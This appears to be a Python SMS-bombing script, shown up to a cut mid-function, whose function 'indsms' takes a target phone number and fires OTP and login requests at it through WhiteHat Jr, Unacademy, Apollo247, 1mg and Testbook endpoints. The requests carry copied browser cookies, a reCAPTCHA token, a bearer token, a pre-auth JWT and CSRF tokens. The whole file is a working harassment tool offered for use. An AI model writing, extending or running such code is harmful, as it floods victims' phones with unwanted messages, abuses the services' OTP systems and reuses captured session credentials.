import time
import asyncio
import aiohttp
import requests
start= time.time()

def indsms(tarnum: int):
    
    
    async def whitehat(tarnum: int ):
        try:
            
            headers = {
            'authority': 'api.whitehatjr.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://code.whitehatjr.com',
            'referer': 'https://code.whitehatjr.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'whjr-amplitude-sessionid': '1688803790709',
            'whjr-segment-anonymousid': 'ce603231-2d29-46c1-82d4-70b1a0a20494',
                }

            params = {
                'deviceId': 'b2477942-81e6-47ba-921d-7d2673862942',
                'timezone': 'Asia/Calcutta',
                'trackingCode': 'trackingCode|AB-11206-V-A|AB-11137-V-A|AB-11184-V-A|AB-11140-V-A|AB-11193-V-B|AB-11194-V-B|AB-11176-V-A|AB-11191-V-B|AB-11181-V-B|AB-11183-V-B|AB-11142-V-A|AB-11196-V-A|AB-11156-V-A|AB-11209-V-A|AB-22-V-B|AB-11192-V-A|AB-11152-V-A|AB-29-V-B|AB-11167-V-A|AB-11204-V-A|AB-11188-V-A|AB-11150-V-B|AB-24-V-C|AB-11163-V-A|AB-13-V-B|AB-11155-V-A|AB-11208-V-B|AB-11186-V-A|AB-11201-V-B|AB-26-V-B|AB-11136-V-A|AB-11195-V-A|AB-11161-V-A|AB-11202-V-A|AB-31-V-A|AB-18-V-A|AB-11210-V-B|AB-11200-V-A|AB-11153-V-B|AB-11154-V-A|AB-11175-V-A|AB-11198-V-A|AB-11159-V-A|AB-11165-V-A|AB-15-V-A|AB-34-V-A|AB-11160-V-B|AB-28-V-B|AB-11169-V-B|AB-25-V-B|AB-11164-V-A|AB-11135-V-A|AB-21-V-C|AB-11182-V-A|AB-17-V-A|AB-37-V-B|AB-23-V-C|AB-12-V-A|AB-11151-V-B|AB-27-V-B|AB-11166-V-A',
                'regionId': 'IN',
                'courseType': 'ALL',
                'brandId': 'whitehatjr',
                'timestamp': '1688803828654',
                '_vercel_no_cache': '1',
                    }

            json_data = {
                'dialCode': '+91',
                'mobile': f'{tarnum}',
                'g-recaptcha-response': '03AAYGu2RQ3WrKIPmFVc_CZyy2gqAgKAc5h3YubYhzlr_VXjKpWjnIlEZ2ij1SZ68Hx6JOP1waWARsDHRJ0PVUpYJUAhmEZXgcRLQMY57DQkzDgez8PQ8P2Ia4Vc47q-AMqVUS2eWLwzuNos8JBUUP0RFC87m3d2ROeViR6IsseygK5ft-w5q-WtUkqUvYywwHtCmApTTmdBMgVbsbTpnX5cRkRSriW3yqG7heX2S2TiPsF377BAL5UGUQmjP93CwUdn8Bf2hhXq60xP77LXoVEvAsOZKxUDmVbf5DqXkWU8w_cSS_ZiIpRjw2xKzRUAj_GZB0s03ZPrewTzbGc3JtY7BKd6TtqNmcQ6CiadK0relg-ccZsLjiIe85KSoFBZfSH9ZeL3PECO3d4GLwHQjxwUNpeF_DB0rFMmT2nWSoyh0RnBGQpF5JkZfzEHuRDEN7jOS1xS_TpmidLkBZP18UWGZNN_tBl0_8nwFpe08uFQ6cqxyvM92sCEyZCoY13a4ZamoRSPBBam3ZK5KPmX_sUhROXrNql_PK6lJd_xA1JAJij7yKP-wYQWKFanKM8dUeldLxyAMg2RhQ',
                    }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers, json=json_data) as response:
                    print(response.text)
             
            return "done"
        except Exception as e:
            return "failed"
    
    async def unacademy(tarnum: int ):
        try:
            cookies = {
                'ajs_anonymous_id': 'b6e6a772_f030_4210_94c7_dd283a1a3687',
                'isDarkModeOn': '',
                '_gcl_au': '1.1.570368325.1683732898',
                '_fbp': 'fb.1.1683732899126.531186259',
                'ajs_anonymous_id': 'b6e6a772_f030_4210_94c7_dd283a1a3687',
                'analytics_session_id': '1686989720508',
                'analytics_session_id.last_access': '1686990936622',
                '_uetvid': '19eba8400ce711ee97a5a9ab0e62f4ea',
                'un_session_id': '03cc6371_1681_455f_b203_0a1809b1fa1c',
                'anonymous_session_id': '43ce8bf8_bc37_43b3_bc4a_06bce23033f5',
                '_abck': '85C1655B267666026DCA1542DA522ACB~-1~YAAQLTxHaGsxdwWJAQAAhXA3MwrfRK7cN+sMIALglQBG5L52N0udblIK5W53O2txFu6UfyFWSvXwD85FEdRzoJ+aegDqfU7MDRu6LO/YES6urQlbHrJfSReloryggTEq2kp2SFI+MH2jWj7STcfTKXdKRHbsVh9aOJxav0Ai1yBoOV31bUkrI2VHdheVVL1EOS4hTeEhpS3LHk5gSqYz4uuKbG/UhYoXavZUjSSNzoyBXZsWoMG45DIElyKHCw7wV2jyR7fIyIJLJNgqc/8R4umsr156NmOL8teiUzvx0h5/S4Z/4AMRi0PuoLQc7o329jYgFmtwWS6rivCmQVCHhKOgeudx3QzWSweAJgcCsqjMgKmmY5FGSNIIR7gVKGjumg3oOSaQF3tbPt3ZaQ==~-1~-1~-1',
                'ak_bmsc': 'F954F1F2E51540069E3200DD0558CD53~000000000000000000000000000000~YAAQLTxHaGwxdwWJAQAAhXA3MxSNf965TZg5wM4Iwjde3FkmDRkGzJ9ftAftvmoN1y602hthmSJkHJ4SZCXnN1C9L8kWHa+/gr+itbmVawOxJDxMNjwLiOji8ukaDQ4Vaah+UIrswhCakxJQg93cPBzvnGQIotk2SjTvQsUdJq6Px/ZTYb2nUoHiGB89ZD9U567m2pIzbMcxeVHnWgxVM7bpV3y7R7F1skwr4EfJde36xtTD8U4QW93STF6XgVR28nsHMJwO+2FNDYKAae+odG+L33ETSqFA5l8G/FEExXSVd+bLwz+wL4JgM5IWC7AnJj06NJdDtv01uS+wSmG9YmPNIwqgymyr04jaRH3TyRuicsERdAV4pkbdWBrDRtE=',
                'bm_sz': '99368CA870768E0B03D406EA6F63482E~YAAQLTxHaG0xdwWJAQAAhXA3MxShLakWdHxdeBVxyO0ZVwFZpUnAzqE6X3EkCE4tpAnuVY+z5M7S+GHKwWY8tA01IxNoIatfxUweuS8KohQdmoXOk6/ECSSyINh1HPyN5eOJsTS0fryK5TR5hwCrRq6yx2IYRrjU55fribSe0X7M1HatlaWoNydcSdbkrQWQMvYtVOihIy984PrdNQsIkax3aZb3oYnSLMheh1W5O08qVUfybLEaShjZzlqH3+din7xGkcgaUbI+1GE/fy3hOze4ruY8pr0xoUp6Q4K3ULe7LTC655o=~4407617~4535097',
                'bm_sv': '3CFEEEEB4C0633749319CA7B62A505A2~YAAQLTxHaHgxdwWJAQAAi3E3MxSQr5SdgRe5qq46VwVG2wJMeLR8XSD6JIlWlQVjW/kkh3iCS7en2ojVml9q1PVVSAG+oukDMg4srXJpIJVb/ta3oB5iR96whEBhgZg2pXoZ7nEHP4iPeG640CipnKPF5sBUZutA+J8MyHQXaHS04JsLDE/NrjKv5JDPrNw1fpcPfQMRQJ6wdS8uCW3Ss5VeGEhayDW2QVzZavD2a+er7P7rK/D5usxUKt/8xgp1uzIx~1',
                '_gcl_aw': 'GCL.1688781210.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
                '__gtm_campaign_url': 'https%3A%2F%2Funacademy.com%2F%3Futm_source%3Dgoogle%26utm_medium%3Dcpc%26utm_campaign%3D11751576405%26utm_term%3Dunacademy%26utm_content%3D%7Bcontent%7D%26gad%3D1%26gclid%3DCj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
                '__gtm_referrer': 'https%3A%2F%2Fwww.google.com%2F',
                '_gid': 'GA1.2.2009585991.1688781210',
                '_gat_UA-69016858-2': '1',
                '_gac_UA-5306665-19': '1.1688781210.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
                '_gat_UA-5306665-19': '1',
                '_ga_6JX23YC5TQ': 'GS1.1.1688781210.4.0.1688781210.0.0.0',
                'ln_or': 'eyIyNjAyOTU2IjoiZCJ9',
                '_ga': 'GA1.2.387904297.1676749491',
                '_gac_UA-69016858-2': '1.1688781211.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
                    }


            headers = {
                 'authority': 'unacademy.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': 'ajs_anonymous_id=b6e6a772_f030_4210_94c7_dd283a1a3687; isDarkModeOn=; _gcl_au=1.1.570368325.1683732898; _fbp=fb.1.1683732899126.531186259; ajs_anonymous_id=b6e6a772_f030_4210_94c7_dd283a1a3687; analytics_session_id=1686989720508; analytics_session_id.last_access=1686990936622; _uetvid=19eba8400ce711ee97a5a9ab0e62f4ea; un_session_id=03cc6371_1681_455f_b203_0a1809b1fa1c; anonymous_session_id=43ce8bf8_bc37_43b3_bc4a_06bce23033f5; _abck=85C1655B267666026DCA1542DA522ACB~-1~YAAQLTxHaGsxdwWJAQAAhXA3MwrfRK7cN+sMIALglQBG5L52N0udblIK5W53O2txFu6UfyFWSvXwD85FEdRzoJ+aegDqfU7MDRu6LO/YES6urQlbHrJfSReloryggTEq2kp2SFI+MH2jWj7STcfTKXdKRHbsVh9aOJxav0Ai1yBoOV31bUkrI2VHdheVVL1EOS4hTeEhpS3LHk5gSqYz4uuKbG/UhYoXavZUjSSNzoyBXZsWoMG45DIElyKHCw7wV2jyR7fIyIJLJNgqc/8R4umsr156NmOL8teiUzvx0h5/S4Z/4AMRi0PuoLQc7o329jYgFmtwWS6rivCmQVCHhKOgeudx3QzWSweAJgcCsqjMgKmmY5FGSNIIR7gVKGjumg3oOSaQF3tbPt3ZaQ==~-1~-1~-1; ak_bmsc=F954F1F2E51540069E3200DD0558CD53~000000000000000000000000000000~YAAQLTxHaGwxdwWJAQAAhXA3MxSNf965TZg5wM4Iwjde3FkmDRkGzJ9ftAftvmoN1y602hthmSJkHJ4SZCXnN1C9L8kWHa+/gr+itbmVawOxJDxMNjwLiOji8ukaDQ4Vaah+UIrswhCakxJQg93cPBzvnGQIotk2SjTvQsUdJq6Px/ZTYb2nUoHiGB89ZD9U567m2pIzbMcxeVHnWgxVM7bpV3y7R7F1skwr4EfJde36xtTD8U4QW93STF6XgVR28nsHMJwO+2FNDYKAae+odG+L33ETSqFA5l8G/FEExXSVd+bLwz+wL4JgM5IWC7AnJj06NJdDtv01uS+wSmG9YmPNIwqgymyr04jaRH3TyRuicsERdAV4pkbdWBrDRtE=; bm_sz=99368CA870768E0B03D406EA6F63482E~YAAQLTxHaG0xdwWJAQAAhXA3MxShLakWdHxdeBVxyO0ZVwFZpUnAzqE6X3EkCE4tpAnuVY+z5M7S+GHKwWY8tA01IxNoIatfxUweuS8KohQdmoXOk6/ECSSyINh1HPyN5eOJsTS0fryK5TR5hwCrRq6yx2IYRrjU55fribSe0X7M1HatlaWoNydcSdbkrQWQMvYtVOihIy984PrdNQsIkax3aZb3oYnSLMheh1W5O08qVUfybLEaShjZzlqH3+din7xGkcgaUbI+1GE/fy3hOze4ruY8pr0xoUp6Q4K3ULe7LTC655o=~4407617~4535097; bm_sv=3CFEEEEB4C0633749319CA7B62A505A2~YAAQLTxHaHgxdwWJAQAAi3E3MxSQr5SdgRe5qq46VwVG2wJMeLR8XSD6JIlWlQVjW/kkh3iCS7en2ojVml9q1PVVSAG+oukDMg4srXJpIJVb/ta3oB5iR96whEBhgZg2pXoZ7nEHP4iPeG640CipnKPF5sBUZutA+J8MyHQXaHS04JsLDE/NrjKv5JDPrNw1fpcPfQMRQJ6wdS8uCW3Ss5VeGEhayDW2QVzZavD2a+er7P7rK/D5usxUKt/8xgp1uzIx~1; _gcl_aw=GCL.1688781210.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB; __gtm_campaign_url=https%3A%2F%2Funacademy.com%2F%3Futm_source%3Dgoogle%26utm_medium%3Dcpc%26utm_campaign%3D11751576405%26utm_term%3Dunacademy%26utm_content%3D%7Bcontent%7D%26gad%3D1%26gclid%3DCj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.2009585991.1688781210; _gat_UA-69016858-2=1; _gac_UA-5306665-19=1.1688781210.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB; _gat_UA-5306665-19=1; _ga_6JX23YC5TQ=GS1.1.1688781210.4.0.1688781210.0.0.0; ln_or=eyIyNjAyOTU2IjoiZCJ9; _ga=GA1.2.387904297.1676749491; _gac_UA-69016858-2=1.1688781211.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
                'origin': 'https://unacademy.com',
                'referer': 'https://unacademy.com/?utm_source=google&utm_medium=cpc&utm_campaign=11751576405&utm_term=unacademy&utm_content={content}&gad=1&gclid=Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-platform': '0',
                    }

            params = {
                'enable-email': 'true',
                    }

            json_data = {
                'phone': f'{tarnum}',
                'country_code': 'IN',
                'otp_type': 1,
                'email': '',
                'send_otp': True,
                'is_un_teach_user': False,
                    }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://unacademy.com/api/v3/user/user_check/',
                params=params,
                cookies=cookies,
                headers=headers,
                json=json_data,
                    ) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def apollo247(tarnum: int ):
        try:
            headers = {
                'authority': 'api.apollo247.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer 3d1833da7020e0602165529446587434',
                'content-type': 'application/json',
                'origin': 'https://www.apollopharmacy.in',
                'referer': 'https://www.apollopharmacy.in/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-apollo-pre-auth-key': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGlmaWVyIjoiYmIzNWVhNGZlZjM3NTBlNjU1OTk0ZWZjNDJmOTZiMDFkMjllZWE4ZDVlYjhkMWFhZmQyZWYwY2Y5MDY5ZTE5OSIsImlzc3VlZEF0IjoiMjAyMy0wNy0wOFQxNTozMDoyNS4xNjRaIiwiZGV2aWNlSWQiOiJEZXNrdG9wIiwiaWF0IjoxNjg4ODMwMjI1LCJleHAiOjE2ODg5MTY2MjUsImlzcyI6IkFwb2xsbzI0NyJ9.BndnC-Aserh-OYXVtpIyiKdIB06qrVipWXUMUFu2DUpVpm30FUsz62MWI5VxdzyfuKu8yT0HQhYYnNvjhRJZX-FZ-T84iRbjoV6hp9DnpRfV2rw3dip0_NprZE8Qrxam8OUETivTRIA1nX5l7888xxt-kuPWdR3X74z8G-4e4QnV6DJkkrqjLoZRf3tPd7qlBPzVnE1ZcdR4BJSVqjlSjiQ3ObHmJMpuK4om8YFBvzt_HQ9JtgA_xpgHWADenr5UlpbMz_WgOclG8aOnoU-Wrfiq0nKWhEbzqk6cfjJ_1xPMFV0H2P_acPTtqPwWbkt36QS1aOyMuZWKaf6FH1nD6g',
                'x-app-device-id': 'Desktop',
                'x-app-os': 'web',
            }

            json_data = {
                'operationName': 'Login',
                'variables': {
                    'mobileNumber': f'+91{tarnum}',
                    'loginType': 'PATIENT',
                },
                'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.apollo247.com/', headers=headers, json=json_data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"  

    async def mg1(tarnum: int ):
        try:
            cookies = {
                'VISITOR-ID': 'c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979',
                'city': 'New%20Delhi',
                'abVisitorId': '939604',
                'abExperimentShow': 'false',
                'amoSessionId': '34b0afff-b37b-4a23-bedc-b7c34f31585b',
                '_csrf': 'AKH-us7dH8ukhnXxYddFxMWZ',
                'isLocaleRedirect': 'false',
                'isLocaleUIChange': 'false',
                '_fbp': 'fb.1.1676729831196.2102042321',
                'geolocation': 'false',
                'session': 'r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4',
                'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D',
                'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D',
                'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D',
                'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe',
                'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx',
                'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D',
                'rl_trait': 'RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D',
                '_uetsid': 'ef875af0af9611edbd12a720bc1ea225',
                '_uetvid': 'ef87d4f0af9611ed995c477ccb56e9bb',
                '_gcl_au': '1.1.929593392.1676729832',
                '_nv_sess': '173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE',
                '_nv_uid': '173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0',
                '_nv_utm': '173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==',
                '_nv_did': '173339004.1676729983.10318094147tavoi',
                '_ga_1HF6RR2VT7': 'GS1.1.1676729832.1.0.1676729832.0.0.0',
                '_ga_NPGHGVF7FB': 'GS1.1.1676729832.1.0.1676729832.0.0.0',
                'singular_device_id': '523e24ec-85ce-4cc5-8a1d-f053dc51eb6a',
                'AMP_TOKEN': '%24NOT_FOUND',
                '_ga': 'GA1.2.890613511.1676729832',
                '_gid': 'GA1.2.976323208.1676729833',
                '_dc_gtm_UA-21820217-6': '1',
                '_gat_UA-21820217-6': '1',
                'outbrain_cid_fetch': 'true',
                'shw_13453': '1',
                '_nv_banner_x': '13453',
                '_nv_hit': '173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=',
                'rl_session': 'RudderEncrypt%3AU2FsdGVkX1%2FVC3m%2FmoqzX17bt9B%2Fc0bmbo82X7X5Lc%2Bfb%2BjGRJRrdFf7OF6hkZaU%2FE60GEATjhBeZclfs9LQKGHWIgdNiociVoDP1l7dHwb%2BTe7rpO3FrGk%2B6oWN%2BVoHXxRxm1%2BNzUWiFi3zOpPG9Q%3D%3D',
                'AWSALBTG': 'Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT',
                'AWSALBTGCORS': 'Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT',
            }

            headers = {
                'authority': 'www.1mg.com',
                'accept': 'application/vnd.healthkartplus.v11+json',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache, no-store, must-revalidate',
                'content-type': 'application/json',
                # 'cookie': 'VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; _dc_gtm_UA-21820217-6=1; _gat_UA-21820217-6=1; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; rl_session=RudderEncrypt%3AU2FsdGVkX1%2FVC3m%2FmoqzX17bt9B%2Fc0bmbo82X7X5Lc%2Bfb%2BjGRJRrdFf7OF6hkZaU%2FE60GEATjhBeZclfs9LQKGHWIgdNiociVoDP1l7dHwb%2BTe7rpO3FrGk%2B6oWN%2BVoHXxRxm1%2BNzUWiFi3zOpPG9Q%3D%3D; AWSALBTG=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT; AWSALBTGCORS=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT',
                'hkp-platform': 'Healthkartplus-0.0.1-Desktop',
                'origin': 'https://www.1mg.com',
                'pragma': 'no-cache',
                'referer': 'https://www.1mg.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'visitor-id': 'c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979',
                'x-csrf-token': 'qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE',
                'x-html-canrender': 'True',
                'x-platform': 'Desktop-0.0.1',
            }

            json_data = {
                'number': f'{tarnum}',
                'is_corporate_user': False,
                'is_doctor': False,
            }
            async with aiohttp.ClientSession() as sess:

                async with sess.post('https://www.1mg.com/auth_api/v6/create_token', cookies=cookies, headers=headers, json=json_data) as response:

                    print(response.text)
            return "done"
        except Exception as e:
            return "failed" 

    async def textbook(tarnum: int ):
        try:
            headers = {
                'authority': 'api.testbook.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                # Already added when you pass json=
                # 'content-type': 'application/json',
                'origin': 'https://testbook.com',
                'referer': 'https://testbook.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57',
                'x-tb-client': 'web,1.2',
            }

            json_data = {}
            async with aiohttp.ClientSession() as sess:

                async with sess.post(
                f'https://api.testbook.com/api/v2/otp/send?emailOrMobile={tarnum}&resend=true',
                headers=headers,
                json=json_data,
            ) as response:
            
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    async def tendercut(tarnum: int ):
        try:
            headers = {
                'authority': 'api.tendercuts.in',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
